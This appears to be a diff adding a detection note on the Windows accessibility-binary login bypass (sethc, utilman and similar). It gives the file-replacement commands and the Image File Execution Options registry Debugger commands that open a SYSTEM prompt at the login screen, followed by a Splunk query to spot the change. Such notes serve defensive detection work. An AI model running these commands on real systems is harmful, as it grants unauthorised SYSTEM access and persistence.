@@ -1,0 +1,35 @@
+##### Login Bypass using the following windows LOLBIN exe files #####
+
+'%sethc.exe%'
+'%magnify.exe%' 
+'%narrator.exe%'
+'%osk.exe%'
+'%utilman.exe%'
+'%displayswitch.exe%'
+
+Example:
+
+The “sethc” file is for the Windows Sticky Keys function. Under normal operation, if you hit the Shift key something like 5 times in a row,
+the sticky key dialog box will pop up. Doing so when the sethc file has been replaced with a copy of cmd.exe, opens up a system command prompt at the login screen,
+just like the utilman modification .
+
+'copy c:\windows\system32\sethc.exe c:\  ==> Backup the sethc.exe file'
+'copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe'
+
+As new versions of Windows introduced slightly better protection mechanisms for the System32 folder,
+a new variant emerged – setting cmd.exe as a debugger to the sethc.exe process.  One simple addition to the Windows registry and 
+the attack works just as before, except there is no longer a need to perform file replacement.
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+
+With Utilman.exe binary
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+
+splunk query 
+
+index=index_name "image file execution options\\sethc" | table system,key,val|dedup system,key,val
+
+Reference: 
+
+  https://www.crowdstrike.com/blog/registry-analysis-with-crowdresponse/
